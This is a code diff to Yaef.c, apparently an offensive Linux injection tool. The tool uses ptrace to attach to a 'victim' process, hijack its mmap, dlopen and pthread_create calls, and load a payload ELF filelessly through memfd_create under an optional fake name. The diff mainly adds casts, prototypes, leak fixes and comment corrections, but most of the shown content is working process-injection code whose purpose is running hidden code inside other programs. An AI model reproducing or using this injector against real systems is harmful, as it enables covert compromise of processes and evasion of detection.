@@ -1,26 +1,3 @@
-/*
- * Yaef.c
- *
- * Copyright 2019 0xN3utr0n <0xN3utr0n at pm.me>
- *
- * This program is free software; you can redistribute it and/or modify
- * it under the terms of the GNU General Public License as published by
- * the Free Software Foundation; either version 2 of the License, or
- * (at your option) any later version.
- *
- * This program is distributed in the hope that it will be useful,
- * but WITHOUT ANY WARRANTY; without even the implied warranty of
- * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
- * GNU General Public License for more details.
- *
- * You should have received a copy of the GNU General Public License
- * along with this program; if not, write to the Free Software
- * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
- * MA 02110-1301, USA.
- *
- *
- */
-
 #include "Yaef.h"
 
 #define SYS_MMAP                9
@@ -34,12 +11,25 @@
 #define TRACED                  1
 
 #define MAX_STEPS               5
-#define DEBUG
 
 #define GREEN                   "\033[32m"
 #define RESET                   "\033[0m"
 #define RED                     "\033[31m"
 
+static inline int memfd_create(const char *, unsigned int);
+static pid_t * list_threads(const pid_t);
+static bool aux_read(void *, const size_t, void *, const pid_t);
+static bool aux_write(void *, const size_t, void *, const pid_t);
+static uint64_t search_library(const char *,const pid_t);
+static bool search_function(library_t *, const pid_t);
+static bool search_dyn_segment(library_t *, const pid_t);
+static Elf64_Shdr * elf_section_lookup(const char *, uint8_t *, const Elf64_Ehdr *);
+static uint64_t hijack_syscall(process_t *, struct user_regs_struct *);
+static uint64_t hijack_function(function_t *, pid_t);
+static uint64_t inject_string(const char *, process_t *);
+static bool flow_advance(process_t *);
+static binary_t * scan_elf(int, const char *);
+static void aux_exit(char *, process_t *, binary_t *);
 
 
 /*
@@ -47,7 +37,7 @@
  * @returns a file descriptor.
  */
 
-static inline int
+int
 memfd_create (const char *name, unsigned int flags)
 {
     uint64_t ret;
@@ -59,7 +49,7 @@ memfd_create (const char *name, unsigned int flags)
                     ::"g"(SYS_MEMFD_CREATE), "g"(name), "g"(flags));
 
     asm("mov %%rax, %0" : "=r"(ret));
-    return ret;
+    return (int)ret;
 }
 
 
@@ -70,7 +60,7 @@ memfd_create (const char *name, unsigned int flags)
  * @return a list of said threads.
  */
 
-static pid_t *
+pid_t *
 list_threads (const pid_t pid)
 {
     char dirname[BUF_SIZE + 1]  = {0};
@@ -87,17 +77,21 @@ list_threads (const pid_t pid)
 
     struct dirent  *p_file  = NULL;
     pid_t   tid             = 0;
-    int64_t  max_size       = 0;
-    uint8_t used            = 1;
+    uint64_t  max_size      = 0;
+    uint8_t used            = 0;
 
     /* Obtain the maximum number
     of threads allowed by each process */
-    if((max_size = sysconf(_SC_THREAD_THREADS_MAX)) == -1)
+    max_size = (uint64_t)sysconf(_SC_THREAD_THREADS_MAX);
+    max_size =  ((int64_t)max_size == -1)? BUF_SIZE : max_size;
+
+    if ((p_list = calloc(max_size + 1, sizeof(pid_t))) == NULL) 
     {
-        max_size = BUF_SIZE;
+        perror("[**] Errror: calloc(thread_list) - ");
+        return NULL;
     }
 
-    for (; used <= max_size;)
+    for (; used < max_size;)
     {
         if ((p_file = readdir(p_dir)) == NULL)
             break;
@@ -107,32 +101,15 @@ list_threads (const pid_t pid)
         if (tid < 1)
             continue;
 
-        //increase array size
-        if ((p_list = realloc(p_list, used * sizeof(pid_t))) == NULL)
-        {
-            perror("[**] Error: Failed to allocate memory");
-            return NULL;
-        }
-
-        p_list[used-1] = tid;
+        p_list[used] = tid;
         used++;
     }
 
     closedir(p_dir);
 
-    if (used == 1)
+    if (used == 0)
         return NULL;
 
-    used++; //NULL terminated array.
-
-    if ((p_list = realloc(p_list, used * sizeof(pid_t))) == NULL)
-    {
-        perror("[**] Error: Failed to allocate memory");
-        return NULL;
-    }
-
-    // Terminate list
-    p_list[used-1] = 0;
     return p_list;
 }
 
@@ -145,7 +122,7 @@ list_threads (const pid_t pid)
  * future race conditions while setting breakpoints.
  */
 
-static bool
+bool
 attach_to_process (process_t *victim)
 {
     pid_t *p_list = NULL;
@@ -156,7 +133,7 @@ attach_to_process (process_t *victim)
         return false;
     }
 
-    for (int i = 0; p_list[i] != (pid_t)0; i++)
+    for (int i = 0; p_list[i]; i++)
     {
 #ifdef DEBUG
         printf(GREEN "[*]");
@@ -179,6 +156,7 @@ attach_to_process (process_t *victim)
     }
 
     victim->traced = TRACED;
+    free(p_list);
 
     printf(GREEN "[*]");
     printf(RESET "Attached!\n");
@@ -194,7 +172,7 @@ attach_to_process (process_t *victim)
  * to read big chuncks of remote process's memory.
  */
 
-static bool
+bool
 aux_read (void *p_local, const size_t size, void *p_remote, const pid_t pid)
 {
     struct iovec local =
@@ -226,7 +204,7 @@ aux_read (void *p_local, const size_t size, void *p_remote, const pid_t pid)
  * to write big chunks of data into the remote process's memory.
  */
 
-static bool
+bool
 aux_write (void *p_local, const size_t size, void *p_remote, const pid_t pid)
 {
     struct iovec local =
@@ -294,8 +272,8 @@ exit:
 
 /*
  * Find the addresses of the dynstr and
- * dynsym sections (inside the dynamic section),
- * so we can search for the function symbol and thus, get its offset.
+ * dynsym sections (whithin the dynamic section),
+ * so we can search for the function symbol and thus get its offset.
  */
 bool
 search_function (library_t *p_lib, const pid_t pid)
@@ -369,7 +347,7 @@ search_function (library_t *p_lib, const pid_t pid)
 
 /*
  * Search for the library @p_lib dynamic segment.
- * @return address to said segment.
+ * @return address of said segment.
  */
 
 bool
@@ -386,7 +364,7 @@ search_dyn_segment (library_t *p_lib, const pid_t pid)
     }
 
     p_segmt = (Elf64_Phdr *) (p_lib->lib_addr + bin.e_phoff);
-    segments = bin.e_phnum; //segments entries number
+    segments = bin.e_phnum; //segments' entries number
 
     //lookup the dynamic segment entry on the segment table
     for (uint32_t i = 0; i < segments; i++, p_segmt++)
@@ -424,7 +402,7 @@ elf_section_lookup (const char *str_section,
     void *p_strtable        = p_mem + p_shdr[p_ehdr->e_shstrndx].sh_offset;
     char *str_name          = NULL;
 
-    //Search for sections name in the strings table
+    //Search for sections' name in the strings table
     for (uint8_t i = 0; i < p_ehdr->e_shnum; i++)
     {
         str_name = (char *) p_strtable + p_shdr[i].sh_name;
@@ -443,7 +421,7 @@ elf_section_lookup (const char *str_section,
 /*
  * Take control of a valid syscall and implement our own one.
  * Lastly, redo the original one.
- * @return the return value of the syscall.
+ * @return value of the syscall.
  */
 
 uint64_t
@@ -491,7 +469,7 @@ hijack_syscall (process_t *victim, struct user_regs_struct *p_params)
             victim->syscall.rip -= 2;
         }
 
-        if (i == 0) //redo the syscall with or own args
+        if (i == 0) //redo the syscall with our own args
         {
             victim->syscall = oldregs;
             victim->syscall.rcx -= 2;
@@ -521,9 +499,9 @@ hijack_syscall (process_t *victim, struct user_regs_struct *p_params)
 
 
 /*
- * Modify the value of the process registers, with the help of
+ * Modify the value of the process's registers, with the help of
  * the Ptrace API, in order to alter the flow of the target program.
- * @return the return value of the hijacked function.
+ * @return value of the hijacked function.
  */
 
 uint64_t
@@ -555,7 +533,7 @@ hijack_function (function_t *new, pid_t pid)
     int  status;
 
     //Get next instruction´s opcodes.
-    if ((int64_t)(savedrip = ptrace(PTRACE_PEEKTEXT, pid, oldregs.rip, NULL)) == -1)
+    if ((int64_t)(savedrip = (uint64_t)ptrace(PTRACE_PEEKTEXT, pid, oldregs.rip, NULL)) == -1)
     {
         perror("[**] Error: hijack_function(): get instruction's opcodes");
         return 1;
@@ -570,7 +548,7 @@ hijack_function (function_t *new, pid_t pid)
 
 
     //Set a breakpoint at the next instruction.
-    uint64_t breakpoint = (savedrip & ~0xFF) | INT30;
+    uint64_t breakpoint = (savedrip & (uint64_t)~0xFF) | INT30;
 
     if ((ptrace(PTRACE_POKETEXT, pid, oldregs.rip, (void*) breakpoint)) < 0)
     {
@@ -592,7 +570,7 @@ hijack_function (function_t *new, pid_t pid)
         return 1;
     }
 
-    wait(&status); //It may fail in a multi-thread process
+    wait(&status); //It may fail in a multithread process
 
     if (WIFSTOPPED(status) == false)
     {
@@ -630,8 +608,7 @@ hijack_function (function_t *new, pid_t pid)
 
 
 /*
- * Allocate memory and write a string so it can
- * be used with dlopen().
+ * Allocate memory in the remote process and write a string into it.
  * @return the address.
  */
 
@@ -646,7 +623,7 @@ inject_string (const char *str_path, process_t *victim)
         .rsi = strlen(str_path),
         .rdx = PROT_WRITE | PROT_READ,
         .r10 = MAP_PRIVATE | MAP_ANONYMOUS,
-        .r8 =  -1,
+        .r8 =  (uint64_t) -1,
         .r9 =  0,
         .orig_rax = SYS_MMAP,
     };
@@ -654,12 +631,11 @@ inject_string (const char *str_path, process_t *victim)
     //mmap()
     if ((p_string = hijack_syscall(victim, &params)) == 0)
     {
-        fprintf(stderr, "[**] Error: syscall %d: %s\n",
-                SYS_MMAP, strerror((p_string * (-1))));
+        fprintf(stderr, "[**] Error: syscall %d\n", SYS_MMAP);
         return 0;
     }
 
-    //Write the path into the remote process newly allocated memory.
+    //Write the path into the remote process's newly allocated memory.
     if (aux_write((void *)str_path, strlen(str_path),
                 (void *)p_string, victim->pid) == false)
     {
@@ -681,7 +657,7 @@ inject_string (const char *str_path, process_t *victim)
  * have to work with the same ones over and over again.
  */
 
-static bool
+bool
 flow_advance (process_t *victim)
 {
     int status  = 0;
@@ -730,7 +706,7 @@ load_payload (const char * str_path, const char *str_fname, const char *str_bnam
 
     binary_t *p_bin = NULL;
     char *buff      = NULL;
-    int64_t size    = BUF_SIZE;
+    ssize_t size    = BUF_SIZE;
 
     if ((p_bin = scan_elf(fd, (char*)str_fname)) == NULL)
     {
@@ -752,13 +728,13 @@ load_payload (const char * str_path, const char *str_fname, const char *str_bnam
         return NULL;
     }
 
-    if ((buff = calloc(sizeof(char) * (BUF_SIZE + 1), 1)) == NULL)
+    if ((buff = calloc(1, sizeof(char) * (BUF_SIZE + 1))) == NULL)
     {
         perror("[**] Error: Failed to allocate memory");
         return NULL;
     }
 
-    //Copy the original elf file data into the newly allocated memory
+    //Copy the original elf file's data into the newly allocated memory
     while (size)
     {
         if ((size = read(fd, buff, BUF_SIZE)) < 0)
@@ -768,7 +744,7 @@ load_payload (const char * str_path, const char *str_fname, const char *str_bnam
             return NULL;
         }
 
-        if (write(p_bin->memfd, buff, size) < 0)
+        if (write(p_bin->memfd, buff, (size_t)size) < 0)
         {
             fprintf(stderr, "[**] Error: cannot write to file: %s\n", strerror(errno));
             return NULL;
@@ -776,7 +752,7 @@ load_payload (const char * str_path, const char *str_fname, const char *str_bnam
     }
 
     lseek(p_bin->memfd, 0, SEEK_SET);
-
+    free(buff);
     close(fd);
 
     return p_bin;
@@ -799,11 +775,11 @@ scan_elf (int fd, const char *function)
     Elf64_Ehdr *p_ehdr      = NULL;
     Elf64_Shdr *p_strtab    = NULL;
     Elf64_Shdr *p_symtab    = NULL;
-    void *p_string          = NULL;
+    char *p_string          = NULL;
     Elf64_Sym *p_sym        = NULL;
     char *str_name          = NULL;
 
-    if ((p_bin = calloc(sizeof(binary_t), 1)) == NULL)
+    if ((p_bin = calloc(1, sizeof(binary_t))) == NULL)
     {
         perror("[**] Error: Failed to allocate memory");
         return NULL;
@@ -815,7 +791,7 @@ scan_elf (int fd, const char *function)
         return NULL;
     }
 
-    p_bin->size = st.st_size; //Get file size.
+    p_bin->size = (size_t) st.st_size; //Get file's size.
 
     //Map the executable into memory.
     p_bin->mem = mmap(NULL, p_bin->size, PROT_READ, MAP_PRIVATE, fd, 0);
@@ -851,14 +827,14 @@ scan_elf (int fd, const char *function)
         return NULL;
     }
 
-    //symtab & strtab sections pointers
+    //symtab & strtab sections' pointers
     p_sym = (Elf64_Sym *) (p_symtab->sh_offset + p_bin->mem);
-    p_string = p_strtab->sh_offset + p_bin->mem;
+    p_string = (char *)(p_strtab->sh_offset + p_bin->mem);
 
     //Let's check if the function really exists.
     for (uint8_t j = 0; j < p_symtab->sh_size / sizeof(Elf64_Sym); j++)
     {
-        str_name = (char *) (p_string + p_sym[j].st_name); //Symbol name
+        str_name = (char *) (p_string + p_sym[j].st_name); //Symbol's name
         if (strcmp(str_name, function) == 0)
         {
             p_bin->function = str_name;
@@ -877,7 +853,7 @@ scan_elf (int fd, const char *function)
 
 
 /*
- * Search in the target process for the library @str_name
+ * Search in the target's process for the library @str_name
  * and find the location of the specified function.
  * @return pointer to said library and respective function.
  */
@@ -887,7 +863,7 @@ scan_library (const char *str_lname, const char *str_fname, const pid_t pid)
 {
     library_t *p_lib = NULL;
 
-    if ((p_lib = calloc(sizeof(library_t), 1)) == NULL)
+    if ((p_lib = calloc(1, sizeof(library_t))) == NULL)
     {
         perror("[**] Error: Failed to allocate memory");
         return NULL;
@@ -908,7 +884,7 @@ scan_library (const char *str_lname, const char *str_fname, const pid_t pid)
         return NULL;
     }
 
-    if ((p_lib->func = calloc(sizeof(function_t), 1)) == NULL)
+    if ((p_lib->func = calloc(1, sizeof(function_t))) == NULL)
     {
         perror("[**] Error: Failed to allocate memory");
         return NULL;
@@ -976,7 +952,7 @@ aux_exit (char * str_msg, process_t *victim, binary_t *p_bin)
 #ifdef DEBUG
         //library debugging
         printf(RED " LIBRARY %d:\n\n", i);
-        printf(RESET
+        printf( RESET 
                 "Regex Name 		-> %s\n"
                 "Base Address 		-> %p\n"
                 "Dynamic segment 	-> %p\n"
@@ -984,9 +960,9 @@ aux_exit (char * str_msg, process_t *victim, binary_t *p_bin)
                 "DYNSTR  section		-> %p\n\n",
                 victim->lib[i]->lib_name,
                 (void*)victim->lib[i]->lib_addr,
-                victim->lib[i]->dynamic_segmt,
-                victim->lib[i]->symtab,
-                victim->lib[i]->strtab);
+                (void*)victim->lib[i]->dynamic_segmt,
+                (void*)victim->lib[i]->symtab,
+                (void*)victim->lib[i]->strtab);
 #endif
         if (!victim->lib[i]->func)
         {
@@ -1045,8 +1021,8 @@ aux_exit (char * str_msg, process_t *victim, binary_t *p_bin)
 
 
 /*
- * Hijack the pthread_create() of the target process and
- * create a remote thread with the specified function as entry-point.
+ * Hijack the pthread_create() of the target's process and
+ * create a remote thread with the specified function as entrypoint.
  */
 
 void
@@ -1054,7 +1030,7 @@ __create_thread (process_t *victim, binary_t *p_bin)
 {
     uint64_t p_thread = 0;
 
-    //Let's allocate some space for one of  pthread_create() arguments.
+    //Let's allocate some space for one of pthread_create() arguments.
     struct user_regs_struct params =
     {
             .rdi = 0,
@@ -1076,14 +1052,14 @@ __create_thread (process_t *victim, binary_t *p_bin)
         aux_exit("Pthread flow_advance() Failed", victim, p_bin);
     }
 
-    if ((victim->lib[EVIL]->func = calloc(sizeof(function_t), 1)) == NULL)
+    if ((victim->lib[EVIL]->func = calloc(1, sizeof(function_t))) == NULL)
     {
         aux_exit("[**] Error: Failed to allocate memory", victim, p_bin);
     }
 
     victim->lib[EVIL]->func->func_name = p_bin->function;
 
-    //library base address + function offset = real function address
+    //library base address + function offset = real function's address
     victim->lib[EVIL]->func->func_addr = victim->lib[EVIL]->lib_addr + p_bin->offset;
 
     //pthread_create(pthread_t *thread, , void *(*start_routine) (void *), );
@@ -1103,9 +1079,9 @@ __create_thread (process_t *victim, binary_t *p_bin)
 
 
 /*
- * Hijack the libc dlopen() of the target process and load
+ * Hijack the libc dlopen() of the target's process and load
  * the specified library @str_lib. On success, the mapped
- * binary address is obtained.
+ * binary's address is obtained.
  */
 
 bool
@@ -1114,7 +1090,7 @@ __dl_open (process_t * victim, const char *str_lib,
 {
     uint64_t p_string = 0;
 
-    if ((victim->lib[type] = calloc(sizeof(library_t), 1)) == NULL)
+    if ((victim->lib[type] = calloc(1, sizeof(library_t))) == NULL)
     {
         perror("[**] Error: Failed to allocate memory");
         return false;
@@ -1146,7 +1122,7 @@ __dl_open (process_t * victim, const char *str_lib,
     }
 
     /* dlopen() returns an 'opaque handle', which is hard to deal with,
-    so let's use the good old method: read maps. */
+    so let's use the good old method: read maps file. */
 
     if ((victim->lib[type]->lib_addr = search_library(str_bname, victim->pid)) == 0)
     {
@@ -1171,7 +1147,7 @@ usage (void)
     puts("Usage: ./Yaef <option> <value>...\n");
     puts("\t-p\tTarget process id\n"
         "\t-b\tElf binary path\n"
-        "\t-f\tElf binary function name\n"
+        "\t-f\tElf binary function's name\n"
         "\t-n\tFile fake name (optional)\n");
 
     exit(EXIT_FAILURE);
